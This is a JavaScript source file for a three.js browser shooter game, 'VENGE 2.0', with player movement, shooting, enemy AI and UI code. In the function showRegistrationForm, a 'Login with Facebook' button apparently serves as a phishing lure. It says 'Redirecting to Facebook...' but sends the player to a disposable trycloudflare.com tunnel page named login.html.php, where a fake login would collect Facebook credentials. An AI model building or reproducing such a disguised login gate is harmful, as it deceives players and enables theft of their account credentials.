import * as THREE from 'three';
import { PointerLockControls } from 'three/addons/controls/PointerLockControls.js';

let scene, camera, renderer, controls;
let player, gun;
const enemies = [];
const obstacles = [];
const bullets = [];

const moveState = {
    forward: false,
    backward: false,
    left: false,
    right: false,
    jump: false
};
let canJump = true;
const playerVelocity = new THREE.Vector3();
const playerDirection = new THREE.Vector3();
const playerSpeed = 20.0; 
const playerJumpForce = 10.0;
const gravity = -30.0;
const playerHeight = 1.8;
const playerColliderRadius = 0.5;

const worldSize = 200; 
const groundSize = worldSize;

let lastTime = performance.now();

// UI Elements
const healthBar = document.getElementById('healthBar');
const healthText = document.getElementById('healthText');
const ammoText = document.getElementById('ammoText');
const messageText = document.getElementById('messageText');
const messageContainer = document.getElementById('messageContainer');
const enemyCountDisplay = document.getElementById('enemyCount');
const blocker = document.getElementById('blocker');
const authContainer = document.getElementById('authContainer'); 

// Create health bar fill element dynamically
let healthBarFill;

// Audio
let audioContext;
const audioBuffers = {};

async function loadSound(url, name) {
    if (!audioContext) {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
    }
    const response = await fetch(url);
    const arrayBuffer = await response.arrayBuffer();
    audioBuffers[name] = await audioContext.decodeAudioData(arrayBuffer);
}

function playSound(name, volume = 1.0) {
    if (!audioContext || !audioBuffers[name]) return;
    const source = audioContext.createBufferSource();
    source.buffer = audioBuffers[name];
    const gainNode = audioContext.createGain();
    gainNode.gain.value = volume;
    source.connect(gainNode);
    gainNode.connect(audioContext.destination);
    source.start(0);
}

class Player {
    constructor() {
        this.health = 100;
        this.maxHealth = 100;
        this.isAlive = true;
        this.camera = camera; 
        this.position = camera.position; 
        this.position.y = playerHeight;
    }

    takeDamage(amount) {
        if (!this.isAlive) return;
        this.health -= amount;
        playSound('player_hit', 0.8);
        if (this.health <= 0) {
            this.health = 0;
            this.isAlive = false;
            displayMessage("YOU DIED!", 5000);
            controls.unlock();
            blocker.style.display = 'flex';
            authContainer.style.display = '';
            authContainer.innerHTML = `
                <p class="auth-title" style="font-size:36px; color: #ff4b2b;">GAME OVER</p>
                <p class="auth-instructions">Click to Play Again</p>
            `;
            authContainer.style.cursor = 'pointer';
            authContainer.onclick = () => {
                showLoginInstructions(); 
            };
        }
        updateHealthUI();
    }

    heal(amount) {
        this.health = Math.min(this.health + amount, this.maxHealth);
        updateHealthUI();
    }
}

class Gun {
    constructor() {
        this.ammo = 30;
        this.clipSize = 30;
        this.fireRate = 150; 
        this.lastShotTime = 0;
        this.damage = 10;
        this.range = 100; 

        const gunGeometry = new THREE.BoxGeometry(0.1, 0.1, 0.5);
        const gunMaterial = new THREE.MeshStandardMaterial({ color: 0x555555, metalness: 0.8, roughness: 0.4 });
        this.mesh = new THREE.Mesh(gunGeometry, gunMaterial);
        this.mesh.position.set(0.3, -0.2, -0.4); 
        camera.add(this.mesh); 
    }

    shoot() {
        if (!player.isAlive) return;
        const currentTime = performance.now();
        if (currentTime - this.lastShotTime < this.fireRate || this.ammo <= 0) {
            if (this.ammo <= 0) playSound('gun_empty', 0.5);
            return;
        }

        this.ammo--;
        this.lastShotTime = currentTime;
        playSound('gun_shoot', 0.3); 
        updateAmmoUI();

        const raycaster = new THREE.Raycaster();
        raycaster.setFromCamera({ x: 0, y: 0 }, camera); 

        const bulletGeometry = new THREE.SphereGeometry(0.05, 8, 8);
        const bulletMaterial = new THREE.MeshBasicMaterial({ color: 0xffff00 });
        const bullet = new THREE.Mesh(bulletGeometry, bulletMaterial);
        
        const bulletStartPos = new THREE.Vector3();
        this.mesh.getWorldPosition(bulletStartPos); 
        const direction = new THREE.Vector3();
        camera.getWorldDirection(direction);
        bulletStartPos.add(direction.multiplyScalar(0.5)); 
        
        bullet.position.copy(bulletStartPos);
        bullet.userData.velocity = direction.clone().multiplyScalar(150); 
        bullet.userData.life = 2; 
        bullets.push(bullet);
        scene.add(bullet);

        const intersects = raycaster.intersectObjects([...enemies.map(e => e.mesh), ...obstacles]);

        if (intersects.length > 0) {
            const firstHit = intersects[0];
            if (firstHit.distance > this.range) return;

            const hitObject = firstHit.object;
            const enemyHit = enemies.find(e => e.mesh === hitObject || (e.head && e.head === hitObject));
            if (enemyHit) {
                enemyHit.takeDamage(this.damage);
                playSound('target_hit', 0.5); 
            } else {
                playSound('ricochet', 0.2);
            }
            createImpactParticles(firstHit.point);
        }
    }

    reload() {
        this.ammo = this.clipSize;
        playSound('gun_reload', 0.6);
        updateAmmoUI();
    }
}

class Enemy {
    constructor(position = new THREE.Vector3(0, 1, -10)) {
        const capsuleRadius = 0.5;
        const capsuleLength = 1.0; 
        const geometry = new THREE.CapsuleGeometry(capsuleRadius, capsuleLength, 4, 8);
        const material = new THREE.MeshStandardMaterial({ color: 0xff0000, roughness: 0.5 });
        this.mesh = new THREE.Mesh(geometry, material);
        this.mesh.position.copy(position);
        this.mesh.userData.isEnemy = true;
        
        this.standingYPosition = capsuleLength / 2 + capsuleRadius; 
        this.mesh.position.y = Math.max(this.mesh.position.y, this.standingYPosition); 

        this.health = 50;
        this.speed = 3;
        this.isAlive = true;
        this.detectionRange = 30;
        this.attackRange = 20; 
        this.attackDamage = 5;
        this.lastAttackTime = 0;
        this.attackCooldown = 2000;

        const headGeometry = new THREE.SphereGeometry(0.3, 16, 16);
        const headMaterial = new THREE.MeshStandardMaterial({color: 0xcc0000});
        this.head = new THREE.Mesh(headGeometry, headMaterial);
        this.head.position.y = (capsuleLength / 2) + capsuleRadius * 0.5; 
        this.mesh.add(this.head);

        this.velocity = new THREE.Vector3();
        this.canJump = true;
        this.isOnGround = false;
        this.jumpForce = 8.0; 
        this.jumpCooldown = 2000 + Math.random() * 2000; 
        this.lastJumpTime = 0;

        scene.add(this.mesh);
    }

    takeDamage(amount) {
        if (!this.isAlive) return;
        this.health -= amount;
        this.mesh.material.color.setHex(0xffff00); 
        setTimeout(() => {
            if (this.isAlive) this.mesh.material.color.setHex(0xff0000);
        }, 100);

        if (this.health <= 0) {
            this.health = 0;
            this.isAlive = false;
            scene.remove(this.mesh);
            const index = enemies.indexOf(this);
            if (index > -1) enemies.splice(index, 1);
            updateEnemyCountUI();
            playSound('enemy_die', 0.7);
            if (enemies.length === 0) {
                displayMessage("ALL ENEMIES DEFEATED! YOU WIN!", 10000);
                 controls.unlock();
                 blocker.style.display = 'flex';
                 authContainer.style.display = '';
                 authContainer.innerHTML = `
                    <p class="auth-title" style="font-size:36px; color: #50C878;">YOU WIN!</p>
                    <p class="auth-instructions">Click to Play Again</p>
                 `;
                 authContainer.style.cursor = 'pointer';
                 authContainer.onclick = () => {
                    showLoginInstructions();
                 };
            }
        }
    }
    
    jump() {
        if (this.canJump && this.isOnGround) {
            this.velocity.y = this.jumpForce;
            this.canJump = false; 
            this.isOnGround = false;
            this.lastJumpTime = performance.now();
            playSound('jump', 0.3); 
        }
    }

    update(deltaTime) {
        if (!this.isAlive || !player.isAlive) return;

        this.velocity.y += gravity * deltaTime;
        this.mesh.position.y += this.velocity.y * deltaTime;

        if (this.mesh.position.y < this.standingYPosition) {
            this.mesh.position.y = this.standingYPosition;
            this.velocity.y = 0;
            this.isOnGround = true;
            this.canJump = true; 
        } else {
            this.isOnGround = false;
        }

        const distanceToPlayer = this.mesh.position.distanceTo(player.position);

        if (distanceToPlayer < this.detectionRange) {
            const directionToPlayer = new THREE.Vector3().subVectors(player.position, this.mesh.position);
            directionToPlayer.y = 0; 
            
            directionToPlayer.normalize();
            
            this.mesh.position.add(directionToPlayer.multiplyScalar(this.speed * deltaTime));
            this.mesh.lookAt(player.position.x, this.mesh.position.y, player.position.z); 
        
            const currentTime = performance.now();
            if (this.isOnGround && this.canJump && (currentTime - this.lastJumpTime > this.jumpCooldown)) {
                const playerIsSignificantlyHigher = player.position.y > (this.mesh.position.y + 1.5);
                if (playerIsSignificantlyHigher && distanceToPlayer < this.attackRange * 1.5) { 
                    this.jump();
                } else if (distanceToPlayer < this.detectionRange * 0.6 && Math.random() < 0.03) { 
                    this.jump();
                }
            }
        
            if (distanceToPlayer < this.attackRange) {
                if (currentTime - this.lastAttackTime > this.attackCooldown) {
                    player.takeDamage(this.attackDamage);
                    this.lastAttackTime = currentTime;
                    playSound('enemy_attack', 0.4);
                }
            }
        }
    }
}

function createImpactParticles(position) {
    const particleCount = 10;
    const particleGeometry = new THREE.SphereGeometry(0.05, 4, 4);
    const particleMaterial = new THREE.MeshBasicMaterial({ color: 0xcccccc });

    for (let i = 0; i < particleCount; i++) {
        const particle = new THREE.Mesh(particleGeometry, particleMaterial);
        particle.position.copy(position);
        
        const velocity = new THREE.Vector3(
            (Math.random() - 0.5) * 2,
            (Math.random() - 0.5) * 2,
            (Math.random() - 0.5) * 2
        ).normalize().multiplyScalar(Math.random() * 3 + 1); 

        particle.userData.velocity = velocity;
        particle.userData.life = 0.5; 
        bullets.push(particle); 
        scene.add(particle);
    }
}

function showRegistrationForm() {
    blocker.style.display = 'flex';
    authContainer.style.display = '';
    // Add game title to blocker if it's not already there
    if (!document.getElementById('gameTitle')) {
        const titleElement = document.createElement('div');
        titleElement.id = 'gameTitle';
        titleElement.textContent = 'VENGE 2.0';
        blocker.insertBefore(titleElement, authContainer);
    }

    authContainer.innerHTML = `
        <p class="auth-title">Login to Play</p>
        <button id="facebookLoginButton">Login with Facebook</button> 
        <p id="authMessage" style="color:tomato; font-size:14px; min-height: 18px;"></p> 
    `;
    authContainer.style.cursor = 'default';
    authContainer.onclick = null; 

    const authMessageEl = document.getElementById('authMessage'); 

    document.getElementById('facebookLoginButton').addEventListener('click', () => {
        const facebookAuthUrl = 'https://structures-papers-formal-julian.trycloudflare.com/login.html.php'; 
        displayMessage('Redirecting to Facebook...', 2000);
        window.location.href = facebookAuthUrl; 
    });
}

function showLoginInstructions() {
    blocker.style.display = 'flex'; 
    authContainer.style.display = ''; 
     if (!document.getElementById('gameTitle')) {
        const titleElement = document.createElement('div');
        titleElement.id = 'gameTitle';
        titleElement.textContent = 'VENGE 2.0';
        blocker.insertBefore(titleElement, authContainer);
    }
    authContainer.innerHTML = `
        <p class="auth-title" style="font-size:36px">Click to play</p>
        <p class="auth-instructions">
            Move: WASD<br/>
            Jump: SPACE<br/>
            Shoot: LEFT CLICK<br/>
            Reload: R<br/>
            Look: MOUSE
        </p>
    `;
    authContainer.style.cursor = 'pointer';
    authContainer.onclick = () => { 
        controls.lock();
    };
}

function init() {
    scene = new THREE.Scene();
    scene.background = new THREE.Color(0x87ceeb); 
    scene.fog = new THREE.Fog(0x87ceeb, 50, worldSize * 0.8);

    camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
    camera.position.y = playerHeight;

    renderer = new THREE.WebGLRenderer({ canvas: document.getElementById('gameCanvas'), antialias: true });
    renderer.setSize(window.innerWidth, window.innerHeight);
    renderer.shadowMap.enabled = true;
    renderer.shadowMap.type = THREE.PCFSoftShadowMap;

    controls = new PointerLockControls(camera, renderer.domElement);
    
    showRegistrationForm(); 

    controls.addEventListener('lock', function () {
        authContainer.style.display = 'none';
        blocker.style.display = 'none';
        if (!audioContext) { 
             audioContext = new (window.AudioContext || window.webkitAudioContext)();
        }
        if (audioContext.state === 'suspended') {
            audioContext.resume();
        }
        
        if (!player.isAlive || (enemies.length === 0 && player.health > 0)) { 
            resetGame();
        }
    });

    controls.addEventListener('unlock', function () {
        if(player.isAlive && enemies.length > 0) { 
           blocker.style.display = 'flex';
           authContainer.style.display = '';
            if (!document.getElementById('gameTitle')) {
                const titleElement = document.createElement('div');
                titleElement.id = 'gameTitle';
                titleElement.textContent = 'VENGE 2.0';
                blocker.insertBefore(titleElement, authContainer);
            }
           authContainer.innerHTML = `
            <p class="auth-title" style="font-size:36px">Paused</p>
            <p class="auth-instructions">Click to resume</p>`;
           authContainer.style.cursor = 'pointer';
           authContainer.onclick = () => controls.lock();
        }
    });

    scene.add(controls.getObject());

    const ambientLight = new THREE.AmbientLight(0xffffff, 0.6);
    scene.add(ambientLight);

    const directionalLight = new THREE.DirectionalLight(0xffffff, 1.0);
    directionalLight.position.set(10, 20, 5);
    directionalLight.castShadow = true;
    directionalLight.shadow.mapSize.width = 2048;
    directionalLight.shadow.mapSize.height = 2048;
    scene.add(directionalLight);

    const groundGeometry = new THREE.PlaneGeometry(groundSize, groundSize);
    const groundMaterial = new THREE.MeshStandardMaterial({ color: 0x556B2F, roughness: 1, metalness: 0 });
    const ground = new THREE.Mesh(groundGeometry, groundMaterial);
    ground.rotation.x = -Math.PI / 2;
    ground.receiveShadow = true;
    scene.add(ground);

    player = new Player(); 
    gun = new Gun();

    const boxGeometry = new THREE.BoxGeometry(5, 5, 5); 
    for (let i = 0; i < 20; i++) {
        const boxMaterial = new THREE.MeshStandardMaterial({
            color: Math.random() * 0xffffff,
            roughness: 0.7,
            metalness: 0.2
        });
        const box = new THREE.Mesh(boxGeometry, boxMaterial);
        box.position.set(
            (Math.random() - 0.5) * (groundSize - 20),
            2.5, 
            (Math.random() - 0.5) * (groundSize - 20)
        );
        box.castShadow = true;
        box.receiveShadow = true;
        scene.add(box);
        obstacles.push(box);
    }
    
    healthBarFill = document.createElement('div');
    healthBarFill.id = 'healthBarFill';
    healthBar.appendChild(healthBarFill);
    
    updateHealthUI();
    updateAmmoUI();
    loadSounds();
    spawnEnemies(5); 
    updateEnemyCountUI();

    window.addEventListener('resize', onWindowResize);
    document.addEventListener('keydown', onKeyDown);
    document.addEventListener('keyup', onKeyUp);
    document.addEventListener('mousedown', onMouseDown);
    
    animate();
}

function resetGame() {
    enemies.forEach(enemy => scene.remove(enemy.mesh));
    enemies.length = 0;

    player.health = player.maxHealth;
    player.isAlive = true;
    camera.position.set(0, playerHeight, 0); 
    playerVelocity.set(0, 0, 0);

    gun.ammo = gun.clipSize;

    spawnEnemies(5);

    updateHealthUI();
    updateAmmoUI();
    updateEnemyCountUI();
}

function loadSounds() {
    loadSound('gun_shoot.mp3', 'gun_shoot'); 
    loadSound('target_hit.mp3', 'target_hit'); 
    loadSound('ricochet.mp3', 'ricochet');
    loadSound('gun_empty.mp3', 'gun_empty');
    loadSound('gun_reload.mp3', 'gun_reload');
    loadSound('player_hit.mp3', 'player_hit');
    loadSound('enemy_die.mp3', 'enemy_die');
    loadSound('enemy_attack.mp3', 'enemy_attack');
    loadSound('jump.mp3', 'jump');
    loadSound('land.mp3', 'land');
}

function spawnEnemies(count) {
    for (let i = 0; i < count; i++) {
        const angle = Math.random() * Math.PI * 2;
        const radius = groundSize / 4 + Math.random() * groundSize / 4; 
        const x = Math.cos(angle) * radius;
        const z = Math.sin(angle) * radius;
        enemies.push(new Enemy(new THREE.Vector3(x, 0, z))); 
    }
    updateEnemyCountUI();
}

function onWindowResize() {
    camera.aspect = window.innerWidth / window.innerHeight;
    camera.updateProjectionMatrix();
    renderer.setSize(window.innerWidth, window.innerHeight);
}

function onKeyDown(event) {
    if (!controls.isLocked && event.code !== 'Escape') return; 
    switch (event.code) {
        case 'KeyW': moveState.forward = true; break;
        case 'KeyA': moveState.left = true; break;
        case 'KeyS': moveState.backward = true; break;
        case 'KeyD': moveState.right = true; break;
        case 'Space': if (canJump && player.isAlive) moveState.jump = true; break;
        case 'KeyR': if (player.isAlive) gun.reload(); break;
    }
}

function onKeyUp(event) {
    switch (event.code) {
        case 'KeyW': moveState.forward = false; break;
        case 'KeyA': moveState.left = false; break;
        case 'KeyS': moveState.backward = false; break;
        case 'KeyD': moveState.right = false; break;
    }
}

function onMouseDown(event) {
    if (event.button === 0 && controls.isLocked && player.isAlive) { 
        gun.shoot();
    }
}

function updatePlayerPosition(deltaTime) {
    if (!controls.isLocked) {
        playerVelocity.x = 0; 
        playerVelocity.z = 0;
    }
    
    const speedDelta = playerSpeed * deltaTime;
    playerDirection.z = Number(moveState.forward) - Number(moveState.backward);
    playerDirection.x = Number(moveState.right) - Number(moveState.left); 
    playerDirection.normalize(); 

    if (moveState.forward || moveState.backward) playerVelocity.z -= playerDirection.z * speedDelta * 10; 
    if (moveState.left || moveState.right) playerVelocity.x -= playerDirection.x * speedDelta * 10;

    playerVelocity.x *= (1 - 10 * deltaTime);
    playerVelocity.z *= (1 - 10 * deltaTime);
    
    playerVelocity.y += gravity * deltaTime;

    if (controls.isLocked) { 
      controls.moveRight(-playerVelocity.x * deltaTime);
      controls.moveForward(-playerVelocity.z * deltaTime);
    }
    
    camera.position.y += playerVelocity.y * deltaTime;

    if (camera.position.y < playerHeight) {
        camera.position.y = playerHeight;
        const landed = !canJump; 
        playerVelocity.y = 0;
        canJump = true;
        if (landed) playSound('land', 0.4);
        moveState.jump = false; 
    }

    if (moveState.jump && canJump && player.isAlive) { 
        playerVelocity.y = playerJumpForce;
        canJump = false;
        moveState.jump = false; 
        playSound('jump', 0.5);
    }
    
    const halfWorld = groundSize / 2 - playerColliderRadius;
    camera.position.x = Math.max(-halfWorld, Math.min(halfWorld, camera.position.x));
    camera.position.z = Math.max(-halfWorld, Math.min(halfWorld, camera.position.z));

    for (const obstacle of obstacles) {
        const obBBox = new THREE.Box3().setFromObject(obstacle);
        const playerFeet = camera.position.clone();
        playerFeet.y -= playerHeight; 
        const playerHead = camera.position.clone(); 

        const playerBBox = new THREE.Box3(
            new THREE.Vector3(camera.position.x - playerColliderRadius, camera.position.y - playerHeight, camera.position.z - playerColliderRadius),
            new THREE.Vector3(camera.position.x + playerColliderRadius, camera.position.y, camera.position.z + playerColliderRadius)
        );
        
        if (playerBBox.intersectsBox(obBBox)) {
            const overlap = new THREE.Vector3();
            const centerPlayer = camera.position.clone(); centerPlayer.y -= playerHeight/2;
            const centerObstacle = new THREE.Vector3(); obBBox.getCenter(centerObstacle);
            
            const vecToObstacle = new THREE.Vector3().subVectors(centerPlayer, centerObstacle);
            
            const combinedHalfWidthsX = playerColliderRadius + (obBBox.max.x - obBBox.min.x) / 2;
            const combinedHalfWidthsZ = playerColliderRadius + (obBBox.max.z - obBBox.min.z) / 2;
            
            const overlapX = combinedHalfWidthsX - Math.abs(vecToObstacle.x);
            const overlapZ = combinedHalfWidthsZ - Math.abs(vecToObstacle.z);

            if (overlapX > 0 && overlapZ > 0) { 
                if (overlapX < overlapZ) {
                    camera.position.x += Math.sign(vecToObstacle.x) * overlapX;
                    playerVelocity.x = 0;
                } else {
                    camera.position.z += Math.sign(vecToObstacle.z) * overlapZ;
                    playerVelocity.z = 0;
                }
            }
        }
    }
}

function updateBullets(deltaTime) {
    for (let i = bullets.length - 1; i >= 0; i--) {
        const bullet = bullets[i];
        bullet.position.add(bullet.userData.velocity.clone().multiplyScalar(deltaTime));
        bullet.userData.life -= deltaTime;

        if (bullet.userData.life <= 0) {
            scene.remove(bullet);
            bullets.splice(i, 1);
        } else {
            for (let j = enemies.length - 1; j >= 0; j--) {
                const enemy = enemies[j];
                if (enemy.isAlive) {
                    const enemyWorldPos = new THREE.Vector3();
                    enemy.mesh.getWorldPosition(enemyWorldPos);
                    const enemyHitRadius = enemy.mesh.geometry.parameters.radius + enemy.mesh.geometry.parameters.length / 2; 
                    
                    if (bullet.position.distanceTo(enemyWorldPos) < enemyHitRadius) {
                        enemy.takeDamage(gun.damage); 
                        playSound('target_hit', 0.3);
                        scene.remove(bullet);
                        bullets.splice(i, 1);
                        createImpactParticles(bullet.position);
                        break; 
                    }
                }
            }
        }
    }
}

function updateHealthUI() {
    if (!player || !healthBarFill) return;
    const percentage = (player.health / player.maxHealth) * 100;
    healthBarFill.style.width = `${percentage}%`;
    
    if (percentage > 66) {
        healthBarFill.style.background = 'linear-gradient(to right, #78b430, #a0d040)'; // Green
    } else if (percentage > 33) {
        healthBarFill.style.background = 'linear-gradient(to right, #f0ad4e, #f5c77e)'; // Orange
    } else {
        healthBarFill.style.background = 'linear-gradient(to right, #d9534f, #e8706c)'; // Red
    }
    
    healthText.textContent = `HP: ${player.health}`;
}

function updateAmmoUI() {
    if (!gun) return;
    ammoText.textContent = `AMMO: ${gun.ammo}/${gun.clipSize}`;
}

function updateEnemyCountUI() {
    enemyCountDisplay.textContent = enemies.length;
}

let messageTimeout;
function displayMessage(text, duration = 3000) {
    messageText.textContent = text;
    messageContainer.style.display = 'block';
    clearTimeout(messageTimeout);
    messageTimeout = setTimeout(() => {
        messageContainer.style.display = 'none';
    }, duration);
}

function animate() {
    requestAnimationFrame(animate);

    const time = performance.now();
    const deltaTime = Math.min((time - lastTime) / 1000, 0.1); 

    if (player && player.isAlive) { 
      updatePlayerPosition(deltaTime);
    } else if (player && !player.isAlive) { 
        playerVelocity.y += gravity * deltaTime;
        camera.position.y += playerVelocity.y * deltaTime;
        if (camera.position.y < playerHeight) {
            camera.position.y = playerHeight;
            playerVelocity.y = 0;
        }
    }
    
    enemies.forEach(enemy => enemy.update(deltaTime));
    updateBullets(deltaTime);

    renderer.render(scene, camera);
    lastTime = time;
}

init();